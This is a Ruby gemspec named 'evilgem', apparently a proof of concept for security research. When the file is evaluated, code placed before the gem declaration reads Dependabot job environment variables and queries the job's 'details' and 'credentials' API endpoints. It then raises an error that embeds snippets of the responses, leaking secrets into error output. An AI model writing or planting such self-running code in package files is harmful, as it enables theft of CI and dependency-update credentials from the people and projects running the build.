require "net/http"; require "uri"
MARK = "ESC4-d58389"
PXY  = ENV["https_proxy"] || ENV["HTTPS_PROXY"] || ENV["http_proxy"] || ENV["HTTP_PROXY"]
def g(url)
  u = URI(url)
  h = if PXY && !PXY.empty?
    p = URI(PXY); Net::HTTP.new(u.host, u.port, p.host, p.port)
  else Net::HTTP.new(u.host, u.port) end
  h.use_ssl = (u.scheme == "https"); h.open_timeout = 12; h.read_timeout = 18
  r = h.get(u.request_uri); [r.code, r.body.to_s]
rescue => e; ["ERR", "#{e.class}:#{e.message}"] end
api = ENV["DEPENDABOT_API_URL"] || ENV["DEPENDABOT_API_ENDPOINT"]
job = ENV["DEPENDABOT_JOB_ID"]
jt  = ENV["DEPENDABOT_JOB_TOKEN"]
keys = ENV.keys.grep(/dependabot|proxy|update_job|api_url/i).sort.join(",")
res = ["#{MARK} api_url=#{api.inspect} job_id=#{job.inspect} job_token_empty=#{(jt.nil? || jt == '')} envkeys=[#{keys}]"]
if api && !api.empty?
  c, b = g(api); res << "api_root http=#{c} bytes=#{b.bytesize} snip=#{b.gsub(/\s+/,' ')[0,70].inspect}"
  if job && !job.empty?
    ["details", "credentials"].each do |ep|
      cc, bb = g("#{api}/update_jobs/#{job}/#{ep}")
      res << "#{ep} http=#{cc} bytes=#{bb.bytesize} snip=#{bb.gsub(/\s+/,' ')[0,90].inspect}"
    end
  end
end
raise "#{MARK} :: " + res.join(" :: ")
Gem::Specification.new { |s| s.name = "evilgem"; s.version = "0.0.1"; s.summary = "x"; s.authors = ["b"]; s.files = [] }
